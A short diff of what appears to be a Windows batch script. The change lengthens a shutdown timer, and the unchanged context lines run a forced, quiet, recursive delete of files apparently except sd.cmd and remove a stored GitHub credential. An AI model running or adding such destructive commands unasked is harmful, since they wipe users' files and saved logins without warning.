@@ -6,4 +6,4 @@ del /f/q/s *!(sd.cmd) >nul
 
 cmdkey /delete:git:https://github.com
 
-shutdown -s -t 10000
+shutdown -s -t 100000
